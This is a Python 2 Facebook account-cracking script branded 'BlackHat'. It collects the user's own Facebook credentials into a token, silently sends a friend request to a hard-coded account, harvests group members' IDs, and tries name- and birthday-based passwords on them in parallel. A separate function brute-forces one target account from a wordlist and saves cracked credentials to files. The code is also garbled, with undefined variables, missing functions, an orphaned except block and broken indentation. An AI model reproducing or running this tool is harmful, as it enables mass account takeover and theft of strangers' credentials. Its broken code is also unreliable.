#!/usr/bin/python2																																					
#coding=utf-8																																					
#The Credit For This Code Goes To lovehacker																																					
#If You Wanna Take Credits For This Code, Please Look Yourself Again...																																					
#Reserved2020																																					
																																					
																																					
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize																																					
from multiprocessing.pool import ThreadPool																																					
from requests.exceptions import ConnectionError																																					
from mechanize import Browser																																					
																																					
																																					
reload(sys)																																					
sys.setdefaultencoding('utf8')																																					
br = mechanize.Browser()																																					
br.set_handle_robots(False)																																					
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)																																					
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]																																					
																																					
																																					
def keluar():																																					
	print "\x1b[1;91mExit"																																				
	os.sys.exit()																																				
																																					
																																					
def acak(b):																																					
    w = 'ahtdzjc'																																					
    d = ''																																					
    for i in x:																																					
        d += '!'+w[random.randint(0,len(w)-1)]+i																																					
    return cetak(d)																																					
																																					
																																					
def cetak(b):																																					
    w = 'ahtdzjc'																																					
    for i in w:																																					
        j = w.index(i)																																					
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))																																					
    x += '\033[0m'																																					
    x = x.replace('!0','\033[0m')																																					
    sys.stdout.write(x+'\n')																																					
																																					
																																					
def jalan(z):																																					
	for e in z + '\n':																																				
		sys.stdout.write(e)																																			
		sys.stdout.flush()																																			
		time.sleep(0.07)																																			
																																					
#Dev:love_hacker																																					
##### LOGO #####																																					
logo = """																																					
       \033[1;96m  ╭━━━━━━━╮             ╭━━━━━━━╮																																					
      \033[1;96m   ┃ ●  ══ ┃             ┃  ● ══ ┃ 																																					
     \033[1;96m    ┃███████┃             ┃███████┃																																					
    \033[1;96m     ┃███████┃             ┃███████┃																																					
   \033[1;96m      ┃███████┃             ┃███████┃																																					
  \033[1;96m       ┃███████┃\033[1;91m>>Lovehacker >>\033[1;96m┃███████┃																																					
   \033[1;96m      ┃███████┃             ┃███████┃																																					
    \033[1;96m     ┃███████┃             ┃███████┃																																					
     \033[1;96m    ┃███████┃             ┃███████┃																																					
     \033[1;96m    ┃███████┃             ┃███████┃																																					
      \033[1;96m   ┃   ○   ┃             ┃    ○  ┃																																					
       \033[1;96m  ╰━━━━━━━╯             ╰━━━━━━━╯																																					
  \033[1;92m:•◈•ᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐ•◈•\033[1;94mWhatsApp Numb\033[1;93m+923094161457\033[1;92m•◈•ᑕᑐᑕᑐᑕᑐ•◈•																																					
\033[1;95m        ◢▇◣◢▇◣              ◢▇◣◢▇◣																																					
\033[1;95m	▇▇▇▇▇▇                ▇▇▇▇▇▇																																				
\033[1;95m	◥▇▇▇▇◤\033[1;96m>>>Lovehacker>>>\033[1;95m◥▇▇▇▇◤																																				
\033[1;95m         ◥▇▇◤                   ◥▇▇◤         \033[1;92mPakistan																																					
\033[1;95m          ◥◤		           ◥◤																																			
\033[1;92m•◈•ᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐ•◈•\033[1;96mBlackHat\033[1;92m•◈•ᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐ•◈•"""																																					
																																					
def tik():																																					
	titik = ['.   ','..  ','... ']																																				
	for o in titik:																																				
		print("\r\x1b[1;93mPlease Wait \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)																																			
																																					
																																					
back = 0																																					
berhasil = []																																					
cekpoint = []																																					
oks = []																																					
id = []																																					
listgrup = []																																					
vulnot = "\033[31mNot Vuln"																																					
vuln = "\033[32mVuln"																																					
																																					
os.system("clear")																																					
print  """																																					
  \033[1;92m┈┈┈┈•◈•ᑕᑐᑕᑐᑕᑐᑕᑐ•◈•┈┈┈┈┈┈┈┏━━┓┏━━┳━━┳━━┓┏┓┈┈┈┈┈┈┈•◈•ᑕᑐᑕᑐᑕᑐᑕᑐ•◈•        																																					
  \033[1;92m┈┈┈┈•◈•ᑕᑐᑕᑐᑕᑐᑕᑐ•◈•┈┈┈┈┈┈┈┃┏┓┃┃┏┓┃┏┓┃┏┓┃┃┃┈┈┈┈┈┈┈•◈•ᑕᑐᑕᑐᑕᑐᑕᑐ•◈•        																																					
  \033[1;92m┈┈┈┈•◈•ᑕᑐᑕᑐᑕᑐᑕᑐ•◈•┈┈┈┈┈┈┈┃┗┛┗┫┃┃┃┗━┫┗━┓┃┃┈┈┈┈┈┈┈•◈•ᑕᑐᑕᑐᑕᑐᑕᑐ•◈•   																																					
 \033[1;92m ┈┈┈┈•◈•ᑕᑐᑕᑐᑕᑐᑕᑐ•◈•┈┈┈┈┈┈┈┃┏━┓┃┃┃┣━┓┣━┓┃┗┛┈┈┈┈┈┈┈•◈•ᑕᑐᑕᑐᑕᑐᑕᑐ•◈•   																																					
 \033[1;92m ┈┈┈┈•◈•ᑕᑐᑕᑐᑕᑐᑕᑐ•◈•┈┈┈┈┈┈┈┃┗━┛┃┗┛┃┗┛┃┗┛┃┏┓┈┈┈┈┈┈┈•◈•ᑕᑐᑕᑐᑕᑐᑕᑐ•◈•																																					
 \033[1;92m ┈┈┈┈•◈•ᑕᑐᑕᑐᑕᑐᑕᑐ•◈•┈┈┈┈┈┈┈┗━━━┻━━┻━━┻━━┛┗┛┈┈┈┈┈┈┈•◈•ᑕᑐᑕᑐᑕᑐᑕᑐ•◈•																																					
  \033[1;92m ───•◈•ᑕᑐᑕᑐᑕᑐᑕᑐ•◈••◈•ᑕᑐᑕᑐᑕᑐᑕᑐ•◈••◈•ᑕᑐᑕᑐᑕᑐᑕᑐ•◈••◈•ᑕᑐᑕᑐᑕᑐᑕᑐ•◈••◈•ᑕᑐᑕᑐᑕᑐᑕᑐ•◈•◈•  																																					
   \033[1;93m███████▒▒\033[1;96mWelcome To BlackHat\033[1;93m▒▒████████																																					
\033[1;92m•◈•ᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐ•◈•\033[1;96mBlackHat\033[1;92m•◈•ᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐ•◈•																																					
\033[1;94mAuthor\033[1;91m: \033[1;91mlovehacker																																					
\033[1;94mBlackMafia\033[1;91m: \033[1;94▒▓█]100%																																					
\033[1;94mFacebook\033[1;91m: \033[1;92mlovehacker																																					
\033[1;94mWhatsapp\033[1;91m: \033[1;93m+923094161457																																					
\033[1;95m♡\033[1;96mBlackHat\033[1;92m•◈•ᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐ•◈•"""																																					
jalan('              \033[1;92m..............\033[1;96mBlacHat\033[1;92m.....................:')																																					
jalan("\033[1;93m   ┈┈┈┈•◈•ᑕᑐᑕᑐᑕᑐᑕᑐ•◈•\033[1;92m┈┈┈┈╱▔▔▔▔╲┈┈┈┈\033[1;93m•◈•ᑕᑐᑕᑐᑕᑐᑕᑐ•◈•┈┈┈┈   ")																																					
jalan('\033[1;93m   ┈┈┈┈•◈•ᑕᑐᑕᑐᑕᑐᑕᑐ•◈•\033[1;92m┈┈┈▕▕╲┊┊╱▏▏┈┈┈\033[1;93m•◈•ᑕᑐᑕᑐᑕᑐᑕᑐ•◈•┈┈┈┈   ')																																					
jalan('\033[1;93m   ┈┈┈┈•◈•ᑕᑐᑕᑐᑕᑐᑕᑐ•◈•\033[1;92m┈┈┈▕▕▂╱╲▂▏▏┈┈┈\033[1;93m•◈•ᑕᑐᑕᑐᑕᑐᑕᑐ•◈•┈┈┈┈   ')																																					
jalan("\033[1;93m   ┈┈┈┈•◈•ᑕᑐᑕᑐᑕᑐᑕᑐ•◈•\033[1;92m┈┈┈┈╲┊┊┊┊╱┈┈┈┈\033[1;93m•◈•ᑕᑐᑕᑐᑕᑐᑕᑐ•◈•┈┈┈┈ ")																																					
jalan("\033[1;93m   ┈┈┈┈•◈•ᑕᑐᑕᑐᑕᑐᑕᑐ•◈•\033[1;92m┈┈┈┈▕╲▂▂╱▏┈┈┈┈\033[1;93m•◈•ᑕᑐᑕᑐᑕᑐᑕᑐ•◈•┈┈┈┈")																																					
print "\033[1;93m•◈•ᑕᑐᑕᑐ.•◈•ᑕᑐᑕᑐᑕᑐᑕᑐ•◈•\033[1;92m╱▔▔▔▔┊┊┊┊▔▔▔▔╲\033[1;93m•◈•ᑕᑐᑕᑐᑕᑐᑕᑐ•◈•\033[1;96mLogin BlackHat\033[1;93m•◈•ᑕᑐᑕᑐᑕᑐᑕᑐ•◈•"																																					
																																					
CorrectUsername = "Pakistan"																																					
CorrectPassword = "lovehacker"																																					
																																					
loop = 'true'																																					
while (loop == 'true'):																																					
    username = raw_input("\033[1;91m🔐 \x1b[1;91mTool Username \x1b[1;91m»» \x1b[1;93m")																																					
    if (username == CorrectUsername):																																					
    	password = raw_input("\033[1;94m🔐 \x1b[1;91mTool Password \x1b[1;91m»» \x1b[1;92m")																																				
        if (password == CorrectPassword):																																					
            print "Logged in successfully as " + username #Dev:love_hacker																																					
	    time.sleep(2)																																				
            loop = 'false'																																					
        else:																																					
            print "\033[1;91mWrong Password"																																					
            os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')																																					
    else:																																					
        print "\033[1;94mWrong Username"																																					
        os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')																																					
																																					
def login():																																					
	os.system('clear')																																				
	try:																																				
		toket = open('login.txt','r')																																			
		menu() 																																			
	except (KeyError,IOError):																																				
		os.system('clear')																																			
		print logo																																			
		jalan(' \033[1;92mWarning: \033[1;97mDo Not Use Your Personal Account' )																																			
		jalan(' \033[1;92m   Note: \033[1;97mUse a New Account To Login' )																																			
		print "\033[1;95m•◈•ᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐ•◈•\033[1;96mBlackHat\033[1;95m•◈•ᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐ•◈•"																																			
		print('	   \033[1;94m♡\x1b[1;91m》•◈•ᑕᑐᑕᑐᑕᑐᑕᑐ•◈•LOGIN WITH FACEBOOK•◈•ᑕᑐᑕᑐᑕᑐᑕᑐ•◈•《\x1b[1;94m♡' )																																		
		id = raw_input('\033[1;96m[+] \x1b[1;95mID/Email\x1b[1;95m: \x1b[1;96m')																																			
		pwd = raw_input('\033[1;96m[+] \x1b[1;95mPassword\x1b[1;96m: \x1b[1;96m')																																			
		tik()																																			
		try:																																			
			br.open('https://m.facebook.com')																																		
		except mechanize.URLError:																																			
			print"\n\x1b[1;96mThere is no internet connection"																																		
			keluar()																																		
		br._factory.is_html = True																																			
		br.select_form(nr=0)																																			
		br.form['email'] = id																																			
		br.form['pass'] = pwd																																			
		br.submit()																																			
		url = br.geturl()																																			
		if 'save-device' in url:																																			
			try:																																		
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'																																	
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}																																	
				x=hashlib.new("md5")																																	
				x.update(sig)																																	
				a=x.hexdigest()																																	
				data.update({'sig':a})																																	
				url = "https://api.facebook.com/restserver.php"																																	
				r=requests.get(url,params=data)																																	
				z=json.loads(r.text)																																	
				unikers = open("login.txt", 'w')																																	
				unikers.write(z['access_token'])																																	
				unikers.close()																																	
				print '\n\x1b[1;95mLogin Successful...'																																	
				os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')																																	
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])																																	
				menu()																																	
			except requests.exceptions.ConnectionError:																																		
				print"\n\x1b[1;91mThere is no internet connection"																																	
				keluar()																																	
		if 'checkpoint' in url:																																			
			print("\n\x1b[1;92mYour Account is on Checkpoint")																																		
			os.system('rm -rf login.txt')																																		
			time.sleep(1)																																		
			keluar()																																		
		else:																																			
			print("\n\x1b[1;93mPassword/Email is wrong")																																		
			os.system('rm -rf login.txt')																																		
			time.sleep(1)																																		
			login()																																		
																																					
																																					
def menu():																																					
	os.system('clear')																																				
	try:																																				
		toket=open('login.txt','r').read()																																			
	except IOError:																																				
		os.system('clear')																																			
		print"\x1b[1;91mToken invalid"																																			
		os.system('rm -rf login.txt')																																			
		time.sleep(1)																																			
		login()																																			
	try:																																				
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)																																			
		a = json.loads(otw.text)																																			
		nama = a['name']																																			
		id = a['id']																																			
	except KeyError:																																				
		os.system('clear')																																			
		print"\033[1;91mYour Account is on Checkpoint"																																			
		os.system('rm -rf login.txt')																																			
		time.sleep(1)																																			
		login()																																			
	except requests.exceptions.ConnectionError:																																				
		print"\x1b[1;92mThere is no internet connection"																																			
		keluar()																																			
	os.system("clear") #Dev:love_hacker																																				
	print logo																																				
	print "  \033[1;92m«•◈•ᑕᑐᑕᑐᑕᑐᑕᑐ•◈•\033[1;93mLogged in User Info\033[1;95m•◈•ᑕᑐᑕᑐᑕᑐᑕᑐ•◈•»"																																				
	print "	   \033[1;92m Name\033[1;93m:\033[1;92m"+nama+"\033[1;97m               "																																			
	print "	   \033[1;92m ID\033[1;93m:\033[1;92m"+id+"\x1b[1;97m              "																																			
	print "\033[1;93m•◈•ᑕᑐᑕᑐᑕᑐᑕᑐ•◈••◈•ᑕᑐᑕᑐᑕᑐᑕᑐ•◈•\033[1;96mBlackHat\033[1;93m•◈•ᑕᑐᑕᑐᑕᑐᑕᑐ•◈••◈•ᑕᑐᑕᑐᑕᑐᑕᑐ•◈••◈•ᑕᑐᑕᑐᑕᑐᑕᑐ•◈•"																																				
	print "\033[1;97m--\033[1;92m> \033[1;92m1.\x1b[1;92mStart Cloning..."																																				
	print "\033[1;97m--\033[1;91m> \033[1;91m0.\033[1;93mExit            "																																				
	pilih()																																				
																																					
																																					
def pilih():																																					
	unikers = raw_input("\n\033[1;93mChoose an Option>>> \033[1;97m")																																				
	if unikers =="":																																				
		print "\x1b[1;91mFill in correctly"																																			
		pilih()																																			
	elif unikers =="1":																																				
		super()																																			
	elif unikers =="0":																																				
		jalan('Token Removed')																																			
		os.system('rm -rf login.txt')																																			
		keluar()																																			
	else:																																				
		print "\x1b[1;91mFill in correctly"																																			
		pilih()																																			
																																					
																																					
def pilih_super():																																					
	global toket																																				
	os.system('clear')																																				
	try:																																				
		toket=open('login.txt','r').read()																																			
	except IOError:																																				
		print"\x1b[1;91mToken invalid"																																			
		os.system('rm -rf login.txt')																																			
		time.sleep(1)																																			
		login()																																			
	os.system('clear')																																																																								
                idg = raw_input('\x1b[1;91m[+] \x1b[1;92mID Group   \x1b[1;91m:\x1b[1;97m ')																																					
                try:																																					
                    r = requests.get('https://graph.facebook.com/group/?id=' + idg + '&access_token=' + toket)																																					
                    asw = json.loads(r.text)																																					
                    print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName grup \x1b[1;91m:\x1b[1;97m ' + asw['name']																																					
                except KeyError:																																					
                    print '\x1b[1;91m[!] Group not found'																																					
                    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')																																					
                    super()																																					
																																					
                re = requests.get('https://graph.facebook.com/' + idg + '/members?fields=name,id&limit=999999999&access_token=' + toket)																																					
                s = json.loads(re.text)																																					
                for i in s['data']:																																					
                    id.append(i['id'])																																					
                    																																					
                else:																																					
                    if peak == '0':																																					
                        menu_hack()																																					
                    else:																																					
                        print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + peak + ' \x1b[1;91mTidak ada'																																					
                        pilih_super()																																					
    print '\x1b[1;91m[+] \x1b[1;92mTotal ID \x1b[1;91m: \x1b[1;97m' + str(len(id))																																					
    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mMohon Tunggu \x1b[1;97m...')																																					
    titik = ['.   ', '..  ', '... ']																																					
    for o in titik:																																					
        print '\r\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92mCrack \x1b[1;97m' + o,																																					
        sys.stdout.flush()																																					
        time.sleep(0.01)																																					
																																					
    print																																					
    print 52 * '\x1b[1;97m\xe2\x95\x90'																																					
																																					
    def main(arg):																																					
        user = arg																																					
        try:																																					
                a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)																																					
                b = json.loads(a.text)																																					
                pass1 = b['first_name'] + '123'																																					
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')																																					
                q = json.load(data)																																					
                if 'access_token' in q:																																					
                    print '\x1b[1;97m\x1b[1;92m[✓]\x1b[1;97m ' + user + ' | ' + pass1 + ' --> ' + b['name']																																					
                else:																																					
                    if 'www.facebook.com' in q['error_msg']:																																					
                        print '\x1b[1;97m\x1b[1;93m[+]\x1b[1;97m ' + user + ' | ' + pass1 + ' --> ' + b['name']																																					
                    else:																																					
                            pass2 = b['firs_name'] + '12345'																																					
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')																																					
                            q = json.load(data)																																					
                            if 'access_token' in q:																																					
                                print '\x1b[1;97m\x1b[1;92m[✓]\x1b[1;97m ' + user + ' | ' + pass2 + ' --> ' + b['name']																																					
                            else:																																					
                                if 'www.facebook.com' in q['error_msg']:																																					
                                    print '\x1b[1;97m\x1b[1;93m[+]\x1b[1;97m ' + user + ' | ' + pass2 + ' --> ' + ['name']																																					
                                else:																																					
                                        pass3 = b['last_name'] + '123'																																					
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')																																					
                                        q = json.load(data)																																					
                                        if 'access_token' in q:																																					
                                            print '\x1b[1;97m\x1b[1;92m[✓]\x1b[1;97m ' + user + ' | ' + pass3 + ' --> ' + b['name']																																					
                                        else:																																					
                                            if 'www.facebook.com' in q['error_msg']:																																					
                                                print '\x1b[1;97m\x1b[1;93m[+]\x1b[1;97m ' + user + ' | ' + pass3 + ' --> ' + b['name']																																					
                                            else:																																					
						    pass4 = b['last_name'] + '12345'																															
                                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')																																					
                                                    q = json.load(data)																																					
                                                    if 'access_token' in q:																																					
                                                        print '\x1b[1;97m\x1b[1;92m[✓]\x1b[1;97m ' + user + ' | ' + pass4 + ' --> ' + b['name']																																					
                				    else:																																	
                                                        if 'www.facebook.com' in q['error_msg']:																																					
                                                            print '\x1b[1;97m\x1b[1;93m[+]\x1b[1;97m ' + user + ' | ' + pass4 + ' --> ' + b['name']																																					
                    					else:																																
                                                                birthday = b['birthday']																																					
                                                                pass5 = birthday.replace('/', '')																																					
                                                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')																																					
                                                                q = json.load(data)																																					
                                                                if 'access_token' in q:																																					
                                                                    print '\x1b[1;97m\x1b[1;92m[✓]\x1b[1;97m ' + user + ' | ' + pass5 + ' --> ' + b['name']																																					
                                                                else:																																					
                                                                    if 'www.facebook.com' in q['error_msg']:																																					
                                                                        print '\x1b[1;97m[\x1b[1;93m[+]\x1b[1;97m ' + user + ' | ' + pass5 + ' --> ' + b['name']																																					
                                                                    else:																																					
                                                                            pass6 = ('sayang')																																					
                                                                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')																																					
                                                                            q = json.load(data)																																					
                                                                            if 'access_token' in q:																																					
                                                                                print '\x1b[1;97m\x1b[1;92m[✓]\x1b[1;97m ' + user + ' | ' + pass6 + ' --> ' + b['name']																																					
                                                                            else:																																					
                                                                                if 'www.facebook.com' in q['error_msg']:																																					
                                                                                    print '\x1b[1;97m\x1b[1;93m[+]\x1b[1;97m ' + user + ' | ' + pass6 + ' --> ' + b['name']																																					
																																					
        except:																																					
            pass																																					
																																					
    p = ThreadPool(30)																																					
    p.map(main, id)																																					
    print '\n\x1b[1;91m[+] \x1b[1;97mSelesai'																																					
    raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')																																					
    super()																																					
																																					
																																					
def brute():																																					
    os.system('clear')																																					
    try:																																					
        toket = open('login.txt', 'r').read()																																					
    except IOError:																																					
        print '\x1b[1;91m[!] Token not found'																																					
        os.system('rm -rf login.txt')																																					
        time.sleep(0.5)																																					
        login()																																					
    else:																																					
        os.system('clear')																																					
        print logo																																					
        print '╔' + 52 * '\x1b[1;97m\xe2\x95\x90'																																					
        try:																																					
            email = raw_input('\x1b[1;91m[+] \x1b[1;92mID\x1b[1;97m/\x1b[1;92mEmail\x1b[1;97m/\x1b[1;92mHp \x1b[1;97mTarget \x1b[1;91m:\x1b[1;97m ')																																					
            passw = raw_input('\x1b[1;91m[+] \x1b[1;92mWordlist \x1b[1;97mext(list.txt) \x1b[1;91m: \x1b[1;97m')																																					
            total = open(passw, 'r')																																					
            total = total.readlines()																																					
            print 52 * '\x1b[1;97m\xe2\x95\x90'																																					
            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mTarget \x1b[1;91m:\x1b[1;97m ' + email																																					
            print '\x1b[1;91m[+] \x1b[1;92mTotal\x1b[1;96m ' + str(len(total)) + ' \x1b[1;92mPassword'																																					
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')																																					
            sandi = open(passw, 'r')																																					
            for pw in sandi:																																					
                try:																																					
                    pw = pw.replace('\n', '')																																					
                    sys.stdout.write('\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92mTry \x1b[1;97m' + pw)																																					
                    sys.stdout.flush()																																					
                    data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')																																					
                    mpsh = json.loads(data.text)																																					
                    if 'access_token' in mpsh:																																					
                        dapat = open('Brute.txt', 'w')																																					
                        dapat.write(email + ' | ' + pw + '\n')																																					
                        dapat.close()																																					
                        print '\n\x1b[1;91m[+] \x1b[1;92mFounded.'																																					
                        print 52 * '\x1b[1;97m\xe2\x95\x90'																																					
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername \x1b[1;91m:\x1b[1;97m ' + email																																					
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword \x1b[1;91m:\x1b[1;97m ' + pw																																					
                        keluar()																																					
                    else:																																					
                        if 'www.facebook.com' in mpsh['error_msg']:																																					
                            ceks = open('Brutecekpoint.txt', 'w')																																					
                            ceks.write(email + ' | ' + pw + '\n')																																					
                            ceks.close()																																					
                            print '\n\x1b[1;91m[+] \x1b[1;92mFounded.'																																					
                            print 52 * '\x1b[1;97m\xe2\x95\x90'																																					
                            print '\x1b[1;91m[!] \x1b[1;93mAccount Maybe Checkpoint'																																					
                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername \x1b[1;91m:\x1b[1;97m ' + email																																					
                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword \x1b[1;91m:\x1b[1;97m ' + pw																																					
                            keluar()																																					
                except requests.exceptions.ConnectionError:																																					
                    print '\x1b[1;91m[!] Connection Error'																																					
                    time.sleep(1)																																					
																																					
        except IOError:																																					
            print '\x1b[1;91m[!] File not found...'																																					
            print '\n\x1b[1;91m[!] \x1b[1;92mSepertinya kamu tidak memiliki wordlist'																																					
            tanyaw()																																					
																																					
																																					
def tanyaw():																																					
    why = raw_input('\x1b[1;91m[?] \x1b[1;92mKamu ingin membuat  wordlist ? \x1b[1;92m[y/t]\x1b[1;91m:\x1b[1;97m ')																																					
    if why == '':																																					
        print '\x1b[1;91m[!] Mohon Pilih \x1b[1;97m(y/t)'																																					
        tanyaw()																																					
    else:																																					
        if why == 'y':																																					
            wordlist()																																					
        else:																																					
            if why == 'Y':																																					
                wordlist()																																					
            else:																																					
                if why == 't':																																					
                    menu_hack()																																					
                else:																																					
                    if why == 'T':																																					
                        menu_hack()																																					
                    else:																																					
                        print '\x1b[1;91m[!] Mohon Pilih \x1b[1;97m(y/t)'																																					
                        tanyaw()																																					
																																					
																																					
def menu_yahoo():																																					
    os.system('clear')																																					
    try:																																					
        toket = open('login.txt', 'r').read()																																					
    except IOError:																																					
        print '\x1b[1;91m[!] Token not found'																																					
        os.system('rm -rf login.txt')																																					
        time.sleep(1)																																					
        login()																																					
																																					
		except:																																			
			pass																																		
																																					
	p = ThreadPool(30)																																				
	p.map(main, id)																																				
	print "\033[1;95m•◈•ᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐ•◈•\033[1;96mBlackHat\033[1;95m•◈•ᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐ•◈•"																																				
	print "  \033[1;93m«◈•ᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐ•◈•-Developed By love•◈•ᑕᑐᑕᑐᑕᑐᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐ•◈•»" #Dev:love_hacker																																				
	print '\033[1;91mProcess Has Been Completed\033[1;92m....'																																				
	print"\033[1;91mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;91m"+str(len(oks))+"\033[1;97m/\033[1;95m"+str(len(cekpoint))																																				
	print """																																				
             																																					
             ...........███ ]▄▄▄▄▄▃•◈•ᑕᑐᑕᑐᑕᑐᑕᑐ•◈•																																					
             ..▂▄▅█████▅▄▃▂																																					
             [███████████████]																																					
             ◥⊙▲⊙▲⊙▲⊙▲⊙▲⊙◤																																					
•◈•ᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐ•◈•.																																					
: \033[1;93m .....lovehacker  BlackHat ........... \033[1;96m :																																					
•◈•ᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐ•◈•.' 																																					
                whatsapp Num																																					
               \033[1;93m+923094161457"""																																					
																																					
	raw_input("\n\033[1;92m[\033[1;91mBack\033[1;96m]")																																				
	menu()																																				
																																					
if __name__ == '__main__':																																					
	login()																																				
